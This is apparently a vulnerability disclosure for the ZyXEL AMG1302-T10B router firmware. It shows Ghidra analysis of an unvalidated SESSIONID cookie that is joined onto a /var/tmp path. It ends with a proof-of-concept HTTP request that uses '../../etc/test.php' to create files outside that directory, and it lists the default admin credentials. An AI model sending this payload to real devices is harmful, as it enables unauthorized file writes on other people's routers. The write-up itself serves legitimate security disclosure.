### description: 
A directory traversal vulnerability was discovered in the ZyXEL AMG1302-T10B firmware version 2.00(AAJC.16)C0. The vulnerability is present in the FUN_0040fffc function, which is responsible for processing the SESSIONID parameter. This issue allows an attacker to manipulate the file path, potentially leading to unauthorized file creation or access outside the intended directory structure.
### Firmware
**brand**: zyxel 

**product**: AMG1302-T10B

**version**: 2.00(AAJC.16)C0

The firmware can be downloaded from this [website]([Zyxel CPE Devices [Firmware] - Advanced Downloads Firmwares and other resources – Zyxel Support Campus EMEA](https://support.zyxel.eu/hc/en-us/articles/4403361365778-Zyxel-CPE-Devices-Firmware-Advanced-Downloads-Firmwares-and-other-resources#h_01J58MYBXYH3897PEM4KWN7ZBW)) and using FirmAE to simulate the router environment.   The command is
```shell
sudo ./run.sh -r zyxel ../FIRMWARE/2.00(AAJC.16)C0.bin
```
The default username is 'admin', password is '1234'.
The result of the simulation is as follows: 
![[web.png]]
### analyze
Using ghidra, we found that there may be a directory traversal vulnerability in the line 47 of the function FUN_0040fffc

![[analyze1.png]]
We discovered that the variable `local_120` is concatenated from the string constant `"/var/tmp/"` and the variable `uVar5`. We then checked whether the value of `uVar5` is controllable. By analyzing the data flow of `uVar5`, we found that it ultimately originates from `puVar1`.
![[analyze2.png]]
Through analysis of the function `FUN_0040f704` using Ghidra, we determined that the function's purpose is to parse and reassemble formatted key-value pair strings, returning a dynamically allocated array (`local_3c`). Each element of the array points to a structure containing a key (Key) and a value (Value). Combining this with the previous findings, we can infer that the code in function `FUN_0040fffc` is intended to retrieve the value of the `"SESSIONID"` field from the request and create a file. However, there is no validation of the input string, which poses a risk of a directory traversal vulnerability.

The details of the function as follows:

* **Address**: 00410db0   
* **Function**: FUN_0040fffc 
* **Parameter**: SESSIONID
### poc
Burp Suite change the packet as follows
```burpsuite
GET /cgi-bin/pages/maintenance/userAccount/userAccount.html HTTP/1.1

Host: 192.168.1.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://192.168.1.1/cgi-bin/main.html

Cookie: SESSIONID=../../etc/test.php

Upgrade-Insecure-Requests: 1

```
The result of the POC is as follows. You can create the file `test.php` in any location outside of `/var/tmp/`.
![[attack.png]]
